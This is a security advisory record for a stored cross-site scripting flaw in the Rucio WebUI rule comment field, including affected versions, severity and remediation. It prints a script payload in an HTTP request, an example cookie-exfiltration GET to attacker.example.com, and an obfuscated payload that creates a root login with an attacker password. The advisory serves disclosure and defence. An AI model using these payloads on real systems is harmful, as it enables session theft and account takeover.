advisory_id: GHSA-rwj9-7j48-9f7q
datasource_id: github_osv_importer_v2/GHSA-rwj9-7j48-9f7q
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-rwj9-7j48-9f7q/GHSA-rwj9-7j48-9f7q.json
aliases:
  - CVE-2026-25733
summary: "Rucio WebUI Vulnerable to Stored Cross-site Scripting (XSS) through Custom Rule Function\n\
  ### Summary\nA stored Cross-site Scripting (XSS) vulnerability was identified in the Custom\
  \ Rules function of the WebUI where attacker-controlled input is persisted by the backend\
  \ and later rendered in the WebUI without proper output encoding. This allows arbitrary JavaScript\
  \ execution in the context of the WebUI for users who view affected pages, potentially enabling\
  \ session token theft or unauthorized actions.\n\n---\n### Details\nA malicious payload supplied\
  \ in the `comment` field is stored by the backend. When the rule is later viewed or approved,\
  \ the stored script executes in the WebUI origin.\n\n**Create Path**:  \nMonitoring > Subscriptions\
  \ and Rules > Request New Rule > Options > Add Comment\n\n**Trigger Paths**:  \n- **User Trigger**:\
  \ Monitoring > Subscriptions and Rules > Show My Rules > *RULE NAME*  \n  (`https://localhost:8443/ui/rule?rule_id=<RULE_ID>`)\n\
  - **Admin Trigger**: Data Transfer (R2D2) > Approve Rules > *RULE NAME*\n\n**Create Request**\n\
  ```http\nPOST /proxy/rules/ HTTP/1.1\n...\n{\"dids\":[{\"scope\":\"test\",\"name\":\"dataset1\"\
  }],\"account\":\"pentest\",\"ask_approval\":true,\"activity\":\"User Subscriptions\",\"rse_expression\"\
  :\"WEB1\",\"copies\":1,\"grouping\":\"DATASET\",\"lifetime\":15552000,\"comment\":\"<script>alert(document.cookie)</script>\"\
  ,\"asynchronous\":false,\"notify\":\"N\"}\n```\n\n**Response**\n```http\nHTTP/1.1 201 CREATED\n\
  ...\n[\"c2d675c1979d4549b26eede3531a7e6a\"]\n```\n\n**Creating RSE with XSS payload in comment**\n\
  <img width=\"1032\" height=\"667\" alt=\"Creating RSE with XSS payload in comment\" src=\"\
  https://github.com/user-attachments/assets/00258839-5288-48ed-856c-30cfee19d3c4\" />\n\n**Reviewing\
  \ rule creation requests**\n<img width=\"1201\" height=\"625\" alt=\"Reviewing rule creation\
  \ requests\" src=\"https://github.com/user-attachments/assets/1b5fc7af-a664-42dc-a3d4-b00755fe2bd7\"\
  \ />\n\n**XSS Payload triggering on rule review**\n<img width=\"1197\" height=\"417\" alt=\"\
  XXS Payload triggering on rule review\" src=\"https://github.com/user-attachments/assets/463e843a-1e9e-492e-960f-7d3edac2fd1e\"\
  \ />\n\n---\n### Impact\nAny authenticated user who views affected resources may execute attacker-controlled\
  \ JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users\
  \ or administrative users only.\n\nThe impact is amplified by:\n- Session cookies that are\
  \ accessible to JavaScript (missing HttpOnly flag).\n- API tokens exposed to the WebUI via\
  \ JavaScript variables.\n\nAn attacker would likely attempt to exfiltrate the session token\
  \ to an external site by setting an encoded version of the cookie as the path of a GET request\
  \ to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).\n\
  \nAttackers can also perform actions as the victim like creating a new UserPass identity with\
  \ an attacker known password, creating/deleting an RSE, or exfiltrating data.\n\n**XSS Payload\
  \ to Create Root UserPass**\n```html\n<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>\n\
  ```\n\n---\n### Remediation / Mitigation\nAll client-side renderings of server-provided or\
  \ user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe\
  \ methods such as `.html()` should be avoided unless the content is explicitly sanitized.\
  \ Safer alternatives include `.text()`, creating text nodes, or using a templating system\
  \ that enforces automatic escaping.\n\nAdditional defense-in-depth measures include:\n- Enforcing\
  \ a strict Content Security Policy (CSP).\n- Setting the HttpOnly flag on session cookies.\n\
  - Avoiding exposure of API tokens in JavaScript-accessible variables.\n\n> Note that many\
  \ pages were found setting the API token as `token` in an authenticated response like `var\
  \ token = \"root-root-webui-...:\"` (See `/ui/list_accounts` for example)\n\n---\n### Resources\n\
  - OWASP XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)"
impacted_packages:
  - purl: pkg:pypi/rucio-webui
    affected_versions: vers:pypi/<35.8.3
    fixed_versions: vers:pypi/35.8.3
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/rucio-webui
    affected_versions: vers:pypi/>=36.0.0rc1|<38.5.4
    fixed_versions: vers:pypi/38.5.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/rucio-webui
    affected_versions: vers:pypi/>=39.0.0rc1|<39.3.1
    fixed_versions: vers:pypi/39.3.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-rwj9-7j48-9f7q/GHSA-rwj9-7j48-9f7q.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1004
  - CWE-79
references:
  - url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/releases/tag/35.8.3
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/releases/tag/38.5.4
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/releases/tag/39.3.1
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/security/advisories/GHSA-rwj9-7j48-9f7q
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25733
    reference_type:
    reference_id: CVE-2026-25733
